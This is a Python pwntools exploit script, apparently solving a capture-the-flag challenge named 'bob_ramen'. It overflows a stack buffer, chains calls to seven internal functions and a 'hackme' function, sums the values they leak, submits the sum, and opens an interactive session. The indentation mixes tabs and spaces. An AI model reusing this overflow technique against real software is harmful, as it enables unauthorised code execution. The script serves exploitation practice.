from pwn import *
context(arch = 'i386', os = 'linux')
context.log_level = 'debug'
if __name__ == '__main__':
	p = process('./bob_ramen')
	elf = ELF('./bob_ramen')
        shin = elf.symbols['Shin']
        zapa = elf.symbols['Zapa'] 
        anseong = elf.symbols['Anseong']
        neoguli = elf.symbols['Neoguli'] 
        samyang = elf.symbols['Samyang'] 
        yuggae = elf.symbols['Yuggaejang']
        jin = elf.symbols['Jin'] 
        hackme = elf.symbols['hackme']
        ret = 0x08048656
        pay = ""
        pay += "A"*116
        pay += flat(shin,ret,zapa,ret,anseong,ret,neoguli,ret,samyang,ret,yuggae,ret,jin,ret,hackme)
        p.recvuntil("Select Menu:")
	p.sendline("1")
        p.recvuntil("How many FAT did you earned? :")
        p.sendline(pay)
        p.recvuntil("You found  \"Shin Ramen \" (FAT + ")
        data1= p.recvline().rstrip(')\n')
        print data1
        p.recvuntil("You found \"Zapagetty \" (FAT + ")
        data2 = p.recvline().rstrip(')\n')
        print data2
        p.recvuntil("You found \"Anseong Tangmyeon \" (FAT + ")
        data3 = p.recvline().rstrip(')\n')
        print data3
        p.recvuntil("You found \"Neoguli Ramen \" (FAT + ")
        data4 = p.recvline().rstrip(')\n')
        print data4
        p.recvuntil("You found \"Samyang Ramen \" (FAT + ")
        data5 = p.recvline().rstrip(')\n')
        print data5
        p.recvuntil("You found \"Yuggaejang Ramen \" (FAT + ")
        data6 = p.recvline().rstrip(')\n')
        print data6
        p.recvuntil("You found \"Jin Ramen \" (FAT + ")
        data7 = p.recvline().rstrip(')\n')
        print data7

        res = int(data6) + int(data5) + int(data4) + int(data3) + int(data2) + int(data1) + int(data7)
        res = int(res)

        print "result :" + str(res)

        p.recvuntil("Select Menu:")
        p.sendline("1")
        p.recvuntil("How many FAT did you earned? :")
        p.sendline(str(res))

        p.interactive()
	
